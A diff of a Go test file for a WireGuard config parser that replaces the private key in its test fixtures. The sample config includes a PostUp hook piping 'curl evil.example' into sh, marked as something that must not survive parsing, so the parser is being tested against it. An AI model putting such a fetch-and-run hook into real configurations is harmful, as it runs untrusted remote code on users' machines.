@@ -7,7 +7,7 @@ import (
 
 const sample = `
 [Interface]
-PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
+PrivateKey = CMb/441By9P/9iN1L3SbzMYhMPbiNbkHhWB5geBO1Vk=
 Address = 10.166.0.2/32, fd66::2/128
 DNS = 10.166.0.1
 PostUp = curl evil.example | sh   # must not survive parsing
@@ -40,7 +40,7 @@ func TestParseErrors(t *testing.T) {
 		"no key":      "[Interface]\nAddress = 10.0.0.1/32\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\n",
 		"bad key":     "[Interface]\nPrivateKey = nope\n",
 		"unknown key": "[Interface]\nFoo = bar\n",
-		"no peer":     "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nAddress = 10.0.0.1/32\n",
+		"no peer":     "[Interface]\nPrivateKey = CMb/441By9P/9iN1L3SbzMYhMPbiNbkHhWB5geBO1Vk=\nAddress = 10.0.0.1/32\n",
 		"bad section": "[Wat]\n",
 	} {
 		if _, err := Parse(strings.NewReader(in)); err == nil {
